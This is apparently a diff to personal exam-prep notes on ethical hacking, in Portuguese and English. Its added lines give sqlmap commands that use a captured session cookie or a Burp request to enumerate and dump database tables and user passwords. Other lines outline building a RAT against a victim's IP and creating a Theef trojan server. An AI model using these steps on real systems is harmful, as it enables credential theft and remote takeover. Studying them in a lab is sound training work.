@@ -121,6 +121,19 @@ Outra
 1- Usar o OWASP ZAP no WIndows -> Automated Scan
 O bicho faz tudo, soh botar a url pura mesmo
 
+Log in with the given credential. Use cookie to extract the password of a user from the table with sqlmap.
+
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" --dbs    #for Database
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* --tables #for Tables of selected Database
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --colmns #for Column names
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --dump #dump t
+
+Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap
+
+sqlmap -r <txt file from burpsuite> -D <database name> --tables
+sqlmap -r <txt file from burpsuite> -D <database name> --tables --columns
+sqlmap -r <txt file from burpsuite> -D <database name> --dump
+sqlmap -r <txt file from burpsuite> -D <database name> --tables -T users
 
 ```
 # Malware ELF
@@ -128,6 +141,7 @@ O bicho faz tudo, soh botar a url pura mesmo
 DIE - Detect It Easy - Windows
 Module 07 ->  Malware -> analysis tools -> Static Malware.. -> Packing obfuscation -> DIE
 s'o carregar o arquivo
+Nele podemos verificar entropia de arquivos
 
 Ou..
 
@@ -140,6 +154,7 @@ Module 07 ->  Malware ->  Trojans Types -> Remote Acces Trojans (RAT)
 porta 5552 mesmo -> Builder -> bota IP da vitima, aperta em build, gera o arquivo e tem que mandar pra vitima(soh aproveitar pastas com esses utilitarios)
 
 Theef ... Server 'e a vitima e Client o atacante
+Create a Trojan Server using Theef RAT Trojan
 
 ```
 # Android
